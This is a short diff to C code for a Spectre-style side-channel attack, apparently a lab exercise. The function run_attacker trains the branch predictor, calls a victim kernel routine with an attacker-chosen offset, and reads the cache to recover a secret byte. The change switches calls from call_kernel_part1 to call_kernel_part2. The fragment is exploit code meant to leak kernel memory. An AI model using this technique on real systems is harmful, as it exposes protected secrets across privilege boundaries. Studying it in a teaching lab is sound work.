@@ -46,10 +46,10 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     //Step 1 : Train the branch predictor 
 
     for (int i =0; i<200; i++) {
-        call_kernel_part1 (kernel_fd, shared_memory, 1);
-        call_kernel_part1 (kernel_fd, shared_memory, 2);
-        call_kernel_part1 (kernel_fd, shared_memory, 3);
-        call_kernel_part1 (kernel_fd, shared_memory, 4);
+        call_kernel_part2 (kernel_fd, shared_memory, 1);
+        call_kernel_part2 (kernel_fd, shared_memory, 2);
+        call_kernel_part2 (kernel_fd, shared_memory, 3);
+        call_kernel_part2 (kernel_fd, shared_memory, 4);
     }
 
 
@@ -68,7 +68,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // step2 : call the victim 
         for (int i=0; i<7; i++) {
-            call_kernel_part1 (kernel_fd, shared_memory, current_offset);                    
+            call_kernel_part2 (kernel_fd, shared_memory, current_offset);                    
         }
 
         // Step3 : read the cache to retrieve the secret byte
